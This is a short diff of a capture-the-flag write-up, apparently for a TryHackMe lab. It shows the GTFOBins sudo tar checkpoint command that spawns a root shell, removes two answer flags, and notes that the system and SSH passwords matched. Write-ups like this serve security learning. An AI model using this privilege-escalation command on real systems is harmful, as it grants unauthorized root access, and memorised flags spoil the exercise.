@@ -42,9 +42,7 @@ User lin may run the following commands on ip-10-81-169-146:
 A quick look at GTFO Bin's tar listing gives us a command that will elevate our privileges:
 `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 ![[Screenshot 2026-01-31 at 2.53.18 PM.png]]
-### Flags
-- User: _THM{CR1M3_SyNd1C4T3}_
-- Root: _THM{80UN7Y_h4cK3r}_
+
 ### Notes
 In this case, the system password was the same as the SSH pass. I have read that this is standard, although I've found many CTFs make them different.
 
